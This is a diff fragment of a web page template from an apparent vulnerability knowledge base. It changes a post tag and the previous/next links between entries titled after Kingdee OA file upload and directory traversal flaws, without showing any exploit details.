data-url="http://example.org/%E9%87%91%E8%9D%B6oa-eas%E7%B3%BB%E7%BB%9F-uploadlogo.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" data-title="金蝶OA EAS系统 uploadLogo.action 任意文件上传漏洞"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
             </div>
         </div>
     </div>
 
     <div class="post-info-more">
-        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/2023hw%E6%BC%8F%E6%B4%9E/">2023hw漏洞</a></section>
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E5%BA%93/">漏洞知识库</a></section>
         <section>
             <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
         </section>
     </div>
 
-    <div class="post-nav"><a href="/%E9%87%91%E8%9D%B6oa%E4%BA%91%E6%98%9F%E7%A9%BA-scpsupreghandler-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="prev" rel="prev" title="金蝶OA云星空 ScpSupRegHandler 任意文件上传漏洞"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>金蝶OA云星空 ScpSupRegHandler 任意文件上传漏洞</a>
-            <a href="/%E9%87%91%E8%9D%B6oa-%E4%BA%91%E6%98%9F%E7%A9%BA-commonfileserver-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="next" rel="next" title="金蝶OA 云星空 CommonFileServer 任意文件读取漏洞">金蝶OA 云星空 CommonFileServer 任意文件读取漏洞<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+    <div class="post-nav"><a href="/%E9%87%91%E8%9D%B6oa-server_file-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/" class="prev" rel="prev" title="金蝶OA server_file 目录遍历漏洞"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>金蝶OA server_file 目录遍历漏洞</a>
+            <a href="/%E9%87%91%E8%9D%B6oa-apusic%E5%BA%94%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%AD%E9%97%B4%E4%BB%B6-server_file-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/" class="next" rel="next" title="金蝶OA Apusic应用服务器(中间件) server_file 目录遍历漏洞">金蝶OA Apusic应用服务器(中间件) server_file 目录遍历漏洞<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
 </div>
 </article></div>
             </main><footer class="footer">
